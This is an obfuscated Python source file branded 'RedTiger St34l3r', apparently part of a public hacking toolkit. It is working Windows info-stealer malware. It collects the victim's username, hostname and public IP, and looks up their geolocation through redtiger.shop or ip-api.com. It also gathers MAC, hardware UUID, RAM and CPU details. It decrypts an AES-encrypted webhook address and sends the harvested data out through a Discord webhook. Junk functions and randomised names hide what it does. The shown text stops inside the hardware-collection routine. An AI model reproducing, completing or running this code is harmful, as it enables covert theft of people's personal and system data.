
import sys

def AMYWKQDAJEYBGYJQOJJPQTEZYGTHJKMYAWKLDIIIIVJKWEQRIVEYIIBUHBTDOZHIWXLOGGEG():
    def IQAMVVZDLQCNCTJMXYIGZAPLUWZOHUXPIJGIFHNUTOEYCDNOCIZALXIJGFKRTIOWQXROHUHGDXKW():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        UXTNVPJIIMRWNALOVQUQVEPRCORZUIZHNLDOXMYSAHDWPNNKVCVTSSWJMKJSRMBTGAGCHMWTKQIDEFRYFXTNVLRIOM = IQAMVVZDLQCNCTJMXYIGZAPLUWZOHUXPIJGIFHNUTOEYCDNOCIZALXIJGFKRTIOWQXROHUHGDXKW()
        if UXTNVPJIIMRWNALOVQUQVEPRCORZUIZHNLDOXMYSAHDWPNNKVCVTSSWJMKJSRMBTGAGCHMWTKQIDEFRYFXTNVLRIOM == True:
            return UXTNVPJIIMRWNALOVQUQVEPRCORZUIZHNLDOXMYSAHDWPNNKVCVTSSWJMKJSRMBTGAGCHMWTKQIDEFRYFXTNVLRIOM
    except:
        return True
    
if AMYWKQDAJEYBGYJQOJJPQTEZYGTHJKMYAWKLDIIIIVJKWEQRIVEYIIBUHBTDOZHIWXLOGGEG() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
from discord import SyncWebhook
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def FRTATIIDFYSEYWHWKXRTFGEULCEXOVTXRFXEURELJCHJZQRETIJXK(): pass
def YSQPOYTMQSXHBOYUTWJIWFZQLTAATTFSESAQRPMOSMUQXIGIDREQPRHDUSARGQWLIHNINWBGSFAQXKI(): pass
def WUIOYQCHSGHCEPRGUSPPRQXOGGMVVOORIPXCTTYKESJJBFMTKTTAJQTTIUOXCYTEQCCHNRKVWZAE(): pass
def KODMTBPNUSJUZBUWEBKUSIEAYMZDZWLXEKQOMAXNNUAYGRWRLZFFDK(): pass
def ZKFNULLIKNQVTLQDEMVTESCHRABLPXOQKDIEPUBVVFNNCRANCXXFNNOJHWNZNKKMRGRHTNCTFFIHXFMOHL(): pass
def ZWSWIBDPUFNWAVGGBECMHZEUQPFJSADWUTHUVEWGFJAKSFJKMOHULCTAKKMFCEFEEMQTGNHXLBIOZCRJJUYYTUHFYM(): pass
def LNVSPYOHXYUZTIPFNZCBHXGAJMOEIXMNCCSHJNDCCWCQBUADHNBLLJRKWVMVOMIODUUKIAGKIHMRYHCYVYBYGOYXCD(): pass
def ILBDLGSBRYJJLWQCUSSYMAQPOTSQZCJVZXTMFISUBALLBUIIOPBGRULXRFBZHLKHLEUJTAZBUFIHXZGFYSNY(): pass
def WQTZYAKPXEQVSDIWSBBKNBSCIWNRPLGDTCVWOUTZNLDIFETLHAJXLUBHTD(): pass
def IVGOWPLGLPNENTXOQHSPEMMDLPPAKHAWUDZKWZXZRYKGKJXYTQOQGVBQWT(): pass
def CIEMICBUWUBSRYWSIZAFLYMVRGNMIRISBUWZPATWDPXIQBMYWTIJRXRMBWAKSQUFGH(): pass
def EZJDZRCIPICDZNLWPHBZZGFPTWITXZGQSTIJWFHGWCEFFDVTSNEZHQBAYBLXPYTCRNQAPDEJVPXOEY(): pass
def AUNKPANUTRTFVNNKHHGNLGCSCREXUGJKWUFROHVLXENTICPFKTXFKZCYAWOGURCFJUTMFLKWVVIXZUWCOFFJXWKDLHIYJWLT(): pass
def YHBAYPPFTTEIPHOYLNYRRXYEZDLQUPZZOPJLLFWBXXFMPGYUCQPAGWNZDKQUDGVLJYVLYGWEEASMBGTQOQPBSWNRHLBIWG(): pass
def BJIWXSWIZPSRVPHXSDWSJTFUKUDXVJNXZTSNNYVTIFYDVIQXHSEWCNKOEHVDHCVONNZTMRMSOOX(): pass
def ZOPVSHVHSIOUPAAJBFCPBDKPPGABSRXVWPJJBSNLNXQDABAITJJWHBIRACO(): pass
def DMVOXTRLEQRTZAZASDMCGVMSFLJBMFAXIIQCBNSATGQREISLHEKGYWTYKOSATRJVA(): pass
def TSKPSHVHPGUMIUJWVPUTZEVWLGPJEBOQTPGKJAXWGFDYBPBWDNJOXWGAQHFXXEUMHBBAYPEKEXLENBMWF(): pass
def WKRKAAHFJWKWDBNYYJGMYRNNPNUVGWHPBPPGXWOREJMIUUBXGFNOLRCLFS(): pass
def GUHXBYQUTEWNHCVIVNFLYBHCHWWXDOQGCIXFXABRRVONJDMKEUT(): pass

def TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(w3bh00k_ur1, title=None, description=None):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX
        )
        embed.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
        client.send(embed=embed, username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
    except: pass

def UNRTRMNJQKVBJJJWUPJGSCTJDYEYIBYVJUTHGOVDCJMSTJLFJYGPNTIWA(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def HCMUHEJHYRVLZUNLFEMRDZTGZLTJQAFBMQUUJSTRTPGPWHKAKWEUSZYKFSGIWZTVG():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ, JVKCWPJBHDNHVAQEJINUKSSGQKBNIYPOPRKVOEMEKDYOOYCPMLVMYCXMOSMLAISNPOCSOWNRTAPGDFLTTNRT):
    def TDZMUMOKHXZAJKZVWSIKNQCPVQSQEBYAPLTWNCEBAUTIOHMALMJBAVBFLMTE(OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG, DSBZJAHCEJKWNXWRUYMBRYBGSPABEGKSJCYESLQKCGIVTDVPIEJEGLOUJUPHPDWNPEECZQBMRU):
        LKOFYSGDNYNHVUXCXSCADDHTKWUJFAVRQMQXTHVQVXYOFPGDWF = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=DSBZJAHCEJKWNXWRUYMBRYBGSPABEGKSJCYESLQKCGIVTDVPIEJEGLOUJUPHPDWNPEECZQBMRU, iterations=100000, backend=default_backend())
        if isinstance(OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG, str):  
            OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG = OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG.encode()  
        return LKOFYSGDNYNHVUXCXSCADDHTKWUJFAVRQMQXTHVQVXYOFPGDWF.derive(OGQDNEXOYLICIPANNANKGLKYTQLATKFNUNLIOUNRFHQSRHCBWDKPARMSIDPJQZWJDUQNVKG)

    HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data = base64.b64decode(HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ)
    DSBZJAHCEJKWNXWRUYMBRYBGSPABEGKSJCYESLQKCGIVTDVPIEJEGLOUJUPHPDWNPEECZQBMRU = HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data[:16]
    AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ = HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data[16:32]
    HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data = HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data[32:]
    YPDTXPEETRWHORNJQFNQRRIEFSTCXXJECAEUBDAFBUWJXFQQIYKQVYCFMVBDZVXXLSVYPDJWCTEVR = TDZMUMOKHXZAJKZVWSIKNQCPVQSQEBYAPLTWNCEBAUTIOHMALMJBAVBFLMTE(JVKCWPJBHDNHVAQEJINUKSSGQKBNIYPOPRKVOEMEKDYOOYCPMLVMYCXMOSMLAISNPOCSOWNRTAPGDFLTTNRT, DSBZJAHCEJKWNXWRUYMBRYBGSPABEGKSJCYESLQKCGIVTDVPIEJEGLOUJUPHPDWNPEECZQBMRU)
    BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK = Cipher(algorithms.AES(YPDTXPEETRWHORNJQFNQRRIEFSTCXXJECAEUBDAFBUWJXFQQIYKQVYCFMVBDZVXXLSVYPDJWCTEVR), modes.CBC(AIJZLCNXVCBSTLRDDCKETBTHIWIXHLWZLZAJOVJINLZWDHJLDPATJTTDSSQCXZPYMYVSMRNBORUGMAILNZHVSXNDAJ), backend=default_backend())
    OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY = BQQGOGEVKROCDNEXNFWEFQHQEIVQKDMTOVUSDKZKJDCMXSBCYXK.decryptor()
    XQKOKPLWNZVYPQPMMQKSAUNPWFYHKTUZVRUHZIOFBZBPMQWFUELRLNZBTZLLOCWYHBXVTQVBGWRSEAOV = OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY.update(HEKBVTHWDIXAFUABONCIYLTKNDEWGTNZVOMCHRTHCGKVLCAONKXXMJEOXBJKKIFVLPEKCSIGQQHNFVHLQFOMGCLVMZUMQ_data) + OJUUWLNKNANCUGBFLPFFSDTLYGNSNDABFEERCATYWCCSJKNGDDBOEFEVWEZIQUQDNSGDDYAOCCGOXRTY.finalize()
    OMZZPYDSPOXEMMLCTURKOEWQMLIATNXXTPBMOTDKZCBHBLESWHIZNVGCWVFQBAFVKQNENFTSHTSMXTMZVNSZDHEVGNJO = padding.PKCS7(128).unpadder()
    OJBKXFEIIMGPSXLWAXBJJVMLWGXQGEOBILCLKLKSMAHUVJJJHEPTLNUPKUAAMXZUXXVHWKPO = OMZZPYDSPOXEMMLCTURKOEWQMLIATNXXTPBMOTDKZCBHBLESWHIZNVGCWVFQBAFVKQNENFTSHTSMXTMZVNSZDHEVGNJO.update(XQKOKPLWNZVYPQPMMQKSAUNPWFYHKTUZVRUHZIOFBZBPMQWFUELRLNZBTZLLOCWYHBXVTQVBGWRSEAOV) + OMZZPYDSPOXEMMLCTURKOEWQMLIATNXXTPBMOTDKZCBHBLESWHIZNVGCWVFQBAFVKQNENFTSHTSMXTMZVNSZDHEVGNJO.finalize()
    return OJBKXFEIIMGPSXLWAXBJJVMLWGXQGEOBILCLKLKSMAHUVJJJHEPTLNUPKUAAMXZUXXVHWKPO.decode()

UNRTRMNJQKVBJJJWUPJGSCTJDYEYIBYVJUTHGOVDCJMSTJLFJYGPNTIWA("")

try: PLSWFVVDGTGSQJFCWPFRNKDGFQVTQIPVPSNXGAMEEDYFGBYWWCCSRXUPQGSBEKYPIEGNZAGX    = socket.gethostname()
except: PLSWFVVDGTGSQJFCWPFRNKDGFQVTQIPVPSNXGAMEEDYFGBYWWCCSRXUPQGSBEKYPIEGNZAGX = "None"

try: IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG    = os.getlogin()
except: IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG = "None"

try: FSQVCRLMWMWRWMXEWTPOWNJLJAXMZFKMFVJNQLBTBDTQETIGMNRGEIUBLKPHBUSZPUGNMEASJRYRPYKAEWSZBZ    = win32api.GetUserNameEx(win32api.NameDisplay)
except: FSQVCRLMWMWRWMXEWTPOWNJLJAXMZFKMFVJNQLBTBDTQETIGMNRGEIUBLKPHBUSZPUGNMEASJRYRPYKAEWSZBZ = "None"

try: GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV = "None"

try: XXCUTYNFANXCGKCGZZLTNVULTEBSNGRBNTZUCEFKXNLFTEAYYTKMPLPGMSWKQTFAGQZIOYE    = socket.gethostbyname(socket.gethostname())
except: XXCUTYNFANXCGKCGZZLTNVULTEBSNGRBNTZUCEFKXNLFTEAYYTKMPLPGMSWKQTFAGQZIOYE = "None"

MNPBRCBQKNEVXIANDGMCTRHSLDOLPJBPJAEDTWVSEWQUNPFZRSZKTECBLEGLIBLDZPVVWILMDSIPUPKSPJSNIRGNWAFAMTK = r"""
nKNhRjSuEcypWd44rnCmiLgqOS2BgO7uQ4jdVhewYuzlQQTEoYZ8Aso0LvYLMgZ2hGuw4R4m79NAywLKyrKKvrDxIyb9iNbCr9EJuBTUzzc2zkHfzvDinim3EIIS8NABnL8VxPIT5bxEAHYRu/XA5ifvXxFfWztd3vksK8x23tE6KHukVbKdOaoEe1S2Xr+4T2cnH86IFvqEU7XC0xDcnQ==
"""

ZTOTPGQMRVUCTEYGKIJJJBBXSMXZVKYEWDDGNCTFWZABSWMFFV            = "tqcSNjhngtWOchziwqbkXBuPJGDjVJsSfqDVFKqqmaaozggNTdJsygofcOLdHkGYmiWKSDEIpbnFtSYFmWQogErQCZxGNkOZiXfChYwpTUVrFNjlHIciXvpo"
KZAMWVVQJASNIJJBDUJJEXDGAGDDLRVPHQEWJYCNBAHIJLDPHB        = "redtiger.shop"
TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX    = 0xa80505
EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE = "RedTiger St34l3r"
KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM   = "https://cdn.discordapp.com/attachments/1337898355279401023/1341890893858213908/RedTiger-Logo.png?ex=67b7a4c8&is=67b65348&hm=174ddbd80dd8570fa83779687def6eda441a7c12abd3765d970c1958ceeb1ec8&"
WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
VKEHNJDTZNQASSZQWWDGZZDUUFTSILUDMOTYJBDYHLNFRLZCAQDBDTDVJBIKLRDYOABLGPPDQ   = {"text": WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, "icon_url": KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM}
MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ    = f'`{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG} "{GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}"`'
AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP    = KJDDJHCCCBQWIRELTVAVCRICZPFXMWVXISQNURNJXLTEWELNQIPYBY(MNPBRCBQKNEVXIANDGMCTRHSLDOLPJBPJAEDTWVSEWQUNPFZRSZKTECBLEGLIBLDZPVVWILMDSIPUPKSPJSNIRGNWAFAMTK, ZTOTPGQMRVUCTEYGKIJJJBBXSMXZVKYEWDDGNCTFWZABSWMFFV)

LSIKJDMKWKDGKPGTOYKVPKKRFHGZTDJPPTIQGZERENLXAZUYCYMRBPVURFDFAJLZHKJIHQUYGLR         = os.getenv("WINDIR", None).replace(" ", "%20")
HKVVRUMNSUYQWZNJFEZHTTULOTHRNAZLRYUDKFKCRJAYUKRGSZFIGULNVAVUJCRBPOGWVKVYAEVVWPBR     = os.getenv('USERPROFILE', None).replace(" ", "%20")
IKAJSRJAPWJCSCKBXKQCGBLRBMIQZPHHZFHEOHKXICOYEQFGIGHCHXTSDISNOQWAEDLATUZFMEGYPWKN   = os.getenv('LOCALAPPDATA', None).replace(" ", "%20")
OFTUDUJKARLBOMCARWPFVPQQZGDUQLLPAFCHCWSBCAVIYCGAWWMCAIEKKVMPQIALCXTXR = os.getenv('APPDATA', None).replace(" ", "%20")

try:
    ZUFDCOHZQLQNTCRLELHEJNNKTJOOVVUUSWGMBAZLZPODDMQRNLORQLIMZGULTUMVIGEOBTWGMGXAZFBILTSQFLAPXNVZF = requests.get(f"https://{KZAMWVVQJASNIJJBDUJJEXDGAGDDLRVPHQEWJYCNBAHIJLDPHB}/api/ip/ip={GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}")
    NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG = ZUFDCOHZQLQNTCRLELHEJNNKTJOOVVUUSWGMBAZLZPODDMQRNLORQLIMZGULTUMVIGEOBTWGMGXAZFBILTSQFLAPXNVZF.json()

    EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('country', "None")
    EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF_code = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('country_code', "None")
    LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('region', "None")
    LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY_code = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('region_code', "None")
    VSNVVQXMBSFIHATGTCWQVVWHCNMTJSWPHHOTISGWTIGGKZYTCGKTFGVHRDPZQON = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('zip', "None")
    FNKOQKOVSVDOSZHKTUUQLVAQFBZEEFMOZLLMWKGRUYWYNTFEJLPRVFTUZMAV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('city', "None")
    YPWGIQRMYFLHJEUCEMASFDRZVMYZIKVYIZWUMJVPSSHMTTPNKH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('latitude', "None")
    SOEKZPQWECPWBRNMVNKKTZLWDXERDUNXGKSFLUUAREXBGCLOIZAAIJRVRSMMSDKJPGHMLPCJWHQTWCXM = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('longitude', "None")
    OJXPKRSPBICXRLUGJHEIHECYUTPCBUYHKVZGYLDMOZGCDXPEQQZNQQHOQCTNUHKDRWVZTIOTMFPAH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('timezone', "None")
    ABXEQPMLRLPWTUAJEBSPXYKHAIZJWEVDNMMAVCOQADLENEGAQCFCLYTDKGBDJDQWDNPKTAJPLCAEYKQRLICNVQFWFMXW = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('isp', "None")
    RZDHOJSFMAMUTVPJIGEFWVPTPTZUGSTEFICLZEQVYFKKIUVOCBYOJMXBHIGEPOSDBQB = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('org', "None")
    RBAEFCLQDKWJMYDGNCOGCLVJVFETBGCOLQQBCAGLRTIPVKTVMKDBWWSQUTYUXPVTCUQSKSIPPOQZFDIHXGPAAJJQULWRV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('as', "None")
except:
    ZUFDCOHZQLQNTCRLELHEJNNKTJOOVVUUSWGMBAZLZPODDMQRNLORQLIMZGULTUMVIGEOBTWGMGXAZFBILTSQFLAPXNVZF = requests.get(f"http://ip-api.com/json/{GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}")
    NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG = ZUFDCOHZQLQNTCRLELHEJNNKTJOOVVUUSWGMBAZLZPODDMQRNLORQLIMZGULTUMVIGEOBTWGMGXAZFBILTSQFLAPXNVZF.json()

    EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('country', "None")
    EEKSUBIRMRTGSAVCDHXWCFSKFUZYPUINGMLXPMUCTJUZBUJLZKHEONAGJBFTGHWQRHQXWSQF_code = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('countryCode', "None")
    LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('regionName', "None")
    LGTAKYFVIOGPMISZEVPGXCXQOJCSWUOQMAECSUGWINAFOJFISSUUPCGLZQCLLYIPQVSMBVCKHAVKVDMXOZXXKHPCHQYXTNDFAY_code = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('region', "None")
    VSNVVQXMBSFIHATGTCWQVVWHCNMTJSWPHHOTISGWTIGGKZYTCGKTFGVHRDPZQON = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('zip', "None")
    FNKOQKOVSVDOSZHKTUUQLVAQFBZEEFMOZLLMWKGRUYWYNTFEJLPRVFTUZMAV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('city', "None")
    YPWGIQRMYFLHJEUCEMASFDRZVMYZIKVYIZWUMJVPSSHMTTPNKH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('lat', "None")
    SOEKZPQWECPWBRNMVNKKTZLWDXERDUNXGKSFLUUAREXBGCLOIZAAIJRVRSMMSDKJPGHMLPCJWHQTWCXM = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('lon', "None")
    OJXPKRSPBICXRLUGJHEIHECYUTPCBUYHKVZGYLDMOZGCDXPEQQZNQQHOQCTNUHKDRWVZTIOTMFPAH = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('timezone', "None")
    ABXEQPMLRLPWTUAJEBSPXYKHAIZJWEVDNMMAVCOQADLENEGAQCFCLYTDKGBDJDQWDNPKTAJPLCAEYKQRLICNVQFWFMXW = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('isp', "None")
    RZDHOJSFMAMUTVPJIGEFWVPTPTZUGSTEFICLZEQVYFKKIUVOCBYOJMXBHIGEPOSDBQB = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('org', "None")
    RBAEFCLQDKWJMYDGNCOGCLVJVFETBGCOLQQBCAGLRTIPVKTVMKDBWWSQUTYUXPVTCUQSKSIPPOQZFDIHXGPAAJJQULWRV = NWJUUTPCLQMVJOFBAVFLZVYRRIDJSOPMRVBJFDXWILSGGGLNEZYWTOG.get('as', "None")

def LNVSPYOHXYUZTIPFNZCBHXGAJMOEIXMNCCSHJNDCCWCQBUADHNBLLJRKWVMVOMIODUUKIAGKIHMRYHCYVYBYGOYXCD():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    from discord import SyncWebhook, Embed

    try: AWRQHVHOUNBRYTFTLAGJLPGDZXVSSKKFIWNYPTLGMGYPBVWBFRBEBXNKMJILAPUEUEJGILUUWFBDAKXJSYUENLIMUWTRM = {platform.system()}
    except: AWRQHVHOUNBRYTFTLAGJLPGDZXVSSKKFIWNYPTLGMGYPBVWBFRBEBXNKMJILAPUEUEJGILUUWFBDAKXJSYUENLIMUWTRM = "None"

    try: OJRSXUHKWTXVERHCCHPAOZGMTFNSQCIUNODFIZKKBQTGGRNTOYZDZYW = platform.version()
    except: OJRSXUHKWTXVERHCCHPAOZGMTFNSQCIUNODFIZKKBQTGGRNTOYZDZYW = "None"

    try: PVFNVXCLKRJCDGZUGNHZFPQQIDGKHEFHJIOMEWDSQSZAVUBUFNZIHXHTSCBAAIQ = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: PVFNVXCLKRJCDGZUGNHZFPQQIDGKHEFHJIOMEWDSQSZAVUBUFNZIHXHTSCBAAIQ = "None"

    try: LMSSWASIZEKVLYHAKENPYTCTHREUAAYNIGOWSMVMYABYEWXPBYBXCHXCGICAYINSNVSQJZGQHPFDNJMKL = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: LMSSWASIZEKVLYHAKENPYTCTHREUAAYNIGOWSMVMYABYEWXPBYBXCHXCGICAYINSNVSQJZGQHPFDNJMKL = "None"

    try: ZEGGJCMAFWYHDZZUCGQWZIFKTOIRIDYDICMQOHUMUGVVJANHIWPICC = round(psutil.virtual_memory().total / (1024**3), 2)
    except: ZEGGJCMAFWYHDZZUCGQWZIFKTOIRIDYDICMQOHUMUGVVJANHIWPICC = "None"

    try: NPYJUZGYHJLKTJNVCGLHVEWHOYBRYHVWXYHOOHXRJEGNKPWDKFBSOKHREPNWUUPSQYRQKXHVFDZFMWGYABB = platform.processor()
    except: NPYJUZGYHJLKTJNVCGLHVEWHOYBRYHVWXYHOOHXRJEGNKPWDKFBSOKHREPNWUUPSQYRQKXHVFDZFMWGYABB = "None"

    try: ZYLZDDTJHQVBZWNQKBYYESJCLMRRGCLBJUPRJRTZCJUXQXWSZILVLWPXGTZZYIRXCMRMKUNYLQZNKKIOFXDKXJ = psutil.cpu_count(logical=False)
    except: ZYLZDDTJHQVBZWNQKBYYESJCLMRRGCLBJUPRJRTZCJUXQXWSZILVLWPXGTZZYIRXCMRMKUNYLQZNKKIOFXDKXJ = "None"

